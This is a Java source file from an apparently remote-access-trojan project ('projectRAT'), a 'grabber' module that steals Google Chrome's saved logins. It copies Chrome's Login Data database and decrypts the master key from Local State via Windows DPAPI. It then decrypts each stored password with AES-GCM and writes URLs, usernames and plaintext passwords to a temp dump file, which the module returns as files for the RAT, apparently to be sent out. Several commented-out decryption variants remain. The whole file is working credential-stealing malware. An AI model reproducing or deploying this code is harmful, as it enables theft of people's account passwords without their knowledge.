package in.momin5.projectRAT.request.grabbers;

import com.sun.jna.platform.win32.Crypt32Util;
import in.momin5.projectRAT.request.Request;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Random;

public class Test implements Request {

    File infoDumpFile;

    @Override
    public void init() throws Exception {
        ArrayList<String> list = getChromePass();
        infoDumpFile = new File(System.getProperty("java.io.tmpdir") + "/" + new Random().nextInt() + ".dump");
        FileOutputStream dumpStream = new FileOutputStream(infoDumpFile);
        for(String s: list){
            dumpStream.write(s.getBytes());
            dumpStream.write("\n".getBytes());
        }
        dumpStream.flush();
        dumpStream.close();
        infoDumpFile.deleteOnExit();
    }

    @Override
    public String getMessage() {
        return null;
    }

    @Override
    public File[] getFiles() {
        return new File[]{
                infoDumpFile
        };
    }

    private ArrayList<String> getChromePass(){
        ArrayList<String> info = new ArrayList<>();
        Connection conn = null;
        Statement statement = null;

        try {
            String loginDataFile = System.getProperty("user.home") + "/Appdata/Local/Google/Chrome/User Data/Default/Login Data";
            String finalDestination = System.getProperty("java.io.tmpdir") + "/Data";
            File finalDestinationFile = new File(finalDestination);
            FileInputStream in = new FileInputStream(loginDataFile);
            FileOutputStream out = new FileOutputStream(finalDestinationFile);
            int n;
            while ((n = in.read()) != -1){
                out.write(n);
            }
            in.close();
            out.close();

            String stmt = "jdbc:sqlite:" + finalDestination;
            conn = DriverManager.getConnection(stmt);

            statement = conn.createStatement();
            ResultSet rs = statement.executeQuery("SELECT * FROM logins;");
            while (rs.next()){
                String url = rs.getString("action_url");
                if(url == null) url = "URL not found";
                String username = rs.getString("username_value");
                if(username == null) username = "Username not found";
                //InputStream passwordHashStream = rs.getBinaryStream("password_value");
                byte[] encpass = rs.getBytes("password_value");
                info.add(String.format("URL: %s ;USERNAME: %s ;Password: %s",url,username, getDecryptedValue(encpass)));
            }
            rs.close();
            statement.close();
            conn.close();

        }catch (Exception e){
            e.printStackTrace();
        }

        return info;
    }

    private String getDecryptedValue(byte[] data) throws Exception {
        String pathLocalState = System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Local State";
        JSONObject jsonObject = (JSONObject) new JSONParser().parse(new FileReader(pathLocalState));
        String encryptedMasterKeyB64 = (String) ((JSONObject) jsonObject.get("os_crypt")).get("encrypted_key");

        byte[] encryptedMKWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyB64);
        byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMKWithPrefix, 5, encryptedMKWithPrefix.length);

        byte[] masterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey);

        byte[] nonce = Arrays.copyOfRange(data, 3, 3 + 12);
        byte[] ciphertextTag = Arrays.copyOfRange(data, 3 + 12, data.length);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);
        SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
        byte[] password = cipher.doFinal(ciphertextTag);

        return new String(password, StandardCharsets.UTF_8);
    }

    //    private String isToStr(InputStream is) throws IOException {
//        int bufferSize = 1024;
//        char[] buffer = new char[bufferSize];
//        StringBuilder out = new StringBuilder();
//        Reader in = new InputStreamReader(is, StandardCharsets.UTF_8);
//        for (int numRead; (numRead = in.read(buffer, 0, buffer.length)) > 0; ) {
//            out.append(buffer, 0, numRead);
//        }
//        return out.toString();
//    }

    /* private byte[] decryptPass(byte[] encryptedPass, byte[] masterKey) throws Exception {
        byte[] iv = Arrays.copyOfRange(encryptedPass,3,15);
        byte[] payload = Arrays.copyOfRange(encryptedPass,15,encryptedPass.length);
        SecretKey secretKey = new SecretKeySpec(masterKey,0,masterKey.length,"AES");
        byte[] decryptedPass = decrypt(payload,secretKey,iv).getBytes(StandardCharsets.UTF_8);
        decryptedPass = Arrays.copyOfRange(decryptedPass,0,decryptedPass.length - 16);

        return decryptedPass;
    }*/

    /*private String decryptPass(byte[] input, byte[] masterKey) throws Exception {
        byte[] iv = Arrays.copyOfRange(input,3,15);
        byte[] payload = Arrays.copyOfRange(input,15,input.length);


        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        SecretKey secretKey = new SecretKeySpec(masterKey,0,masterKey.length,"AES");
        cipher.init(Cipher.DECRYPT_MODE,secretKey,new GCMParameterSpec(128,input,0,12));
        byte[] decryptedPass = cipher.doFinal(input,12,input.length - 12);
        decryptedPass = Arrays.copyOfRange(decryptedPass,0,decryptedPass.length - 16);

        return Base64.getEncoder().encodeToString(decryptedPass);
        //128, 120, 112, 104, 96
    }*/

    /*private byte[] decryptPayload(byte[] secretKey, byte[] iv, byte[] payload) throws Exception {

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        SecretKeySpec keySpec = new SecretKeySpec(secretKey, "AES");
        GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(16 * 8, iv);
        cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
        byte[] decryptedText = cipher.doFinal(payload);

        return decryptedText;
    }*/

    //    public byte[] decrypt(byte[] cText, String secret, byte[] iv) throws Exception {
//
//        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
//        KeySpec spec = new PBEKeySpec(secret.toCharArray(), "".getBytes(), 65536, 256);
//        SecretKey tmp = factory.generateSecret(spec);
//        SecretKeySpec secretKey = new SecretKeySpec(tmp.getEncoded(), "AES");
//
//        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
//        cipher.init(Cipher.DECRYPT_MODE, secretKey, new GCMParameterSpec(128, iv));
//        byte[] plainText = cipher.doFinal(cText);
//        return plainText;
//
//    }

//    private String decrypt(byte[] cipherMessage, SecretKey secretKey, byte[] iv) throws Exception {
//        final Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
//        //use first 12 bytes for iv
//        AlgorithmParameterSpec gcmIv = new GCMParameterSpec(128, cipherMessage, 0, iv.length);
//        cipher.init(Cipher.DECRYPT_MODE, secretKey, gcmIv);
//
//        //use everything from 12 bytes on as ciphertext
//        byte[] plainText = cipher.doFinal(cipherMessage, iv.length, cipherMessage.length - iv.length);
//
//        return new String(plainText, StandardCharsets.UTF_8);
//    }
//
//    private byte[] getMasterKey() throws IOException {
//        File keyFile = new File(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Local State");
//
//        InputStream is = Files.newInputStream(Paths.get(keyFile.getPath()));
//        JsonElement element = JsonParser.parseReader(new InputStreamReader(is));
//        JsonElement key = element.getAsJsonObject()
//                .get("os_crypt").getAsJsonObject()
//                .get("encrypted_key");
//
//        byte[] decodedKey = Base64.getDecoder().decode(key.getAsString());
//        byte[] encryptedMasterKey = Arrays.copyOfRange(decodedKey,5,decodedKey.length);
//        byte[] decryptedSecretKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey);
//
//        return decryptedSecretKey;
//    }

}
